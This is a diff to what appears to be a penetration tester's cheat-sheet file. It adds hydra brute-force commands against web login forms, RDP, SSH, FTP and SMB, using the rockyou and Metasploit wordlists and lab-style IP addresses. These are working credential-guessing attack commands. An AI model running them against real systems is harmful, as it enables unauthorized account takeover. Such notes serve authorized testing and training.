@@ -1702,16 +1702,31 @@ sudo Responder -I tun0 -A
 ```bash
 hydra <% tp.frontmatter["RHOST"] %> -l <% tp.frontmatter["USERNAME"] %> -P /usr/share/wordlists/<FILE> ftp|ssh|smb://<% tp.frontmatter["RHOST"] %>
 
-hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
+# http-get
+hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.3.20.218 http-get /webdav/
 
+# http-post-form
+hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
 hydra -l <% tp.frontmatter["USERNAME"] %> -P /usr/share/wordlists/rockyou.txt <% tp.frontmatter["RHOST"] %> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
 
 # In this case we find out that the username and passwords are being base64 encoded so we did ^USER64^ and ^PASS64^
 # Also discovered that the fail code is giving us 403 so set that F=403
 hydra -I -f -L  -P passwords.txt 'http-post-form://192.168.243.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
 
+# rdp
 sudo hydra -L /usr/share/wordlists/rockyou.txt -p "<% tp.frontmatter["PASSWORD"] %>" rdp://<% tp.frontmatter["RHOST"] %>
+hydra -L /usernamepath -P /passpath rdp://10.x.x.x -s 3333
+
+# ssh
 sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<% tp.frontmatter["RHOST"] %>
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 192.88.141.3 -t 4 ssh
+sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.x.x
+
+# ftp
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 192.88.141.3 ftp
+
+#smb
+$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.211.66.3 smb
 ```
 
 ### socat
